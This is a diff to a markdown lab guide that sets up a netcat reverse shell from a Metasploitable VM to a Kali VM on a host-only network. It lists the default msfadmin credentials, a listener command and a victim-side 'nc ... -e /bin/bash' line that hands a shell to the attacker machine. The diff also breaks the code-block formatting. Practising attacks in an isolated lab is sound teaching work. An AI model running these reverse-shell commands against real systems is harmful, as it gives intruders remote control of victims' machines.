@@ -17,6 +17,22 @@ Put both VMs on the same **host-only network**.
 Login to Metasploitable: `msfadmin/msfadmin`.
 
 ### 2. Start Listener on Kali
-```bash
+`bash
 ifconfig     # find Kali IP
 nc -l -v -n -p 443
+
+3. Connect from Victim
+
+On Metasploitable:
+
+sudo nc <Kali-IP> 443 -e /bin/bash
+
+4. Verify
+
+On Kali, test:
+
+whoami
+id
+
+
+✅ You now control the victim from attacker.
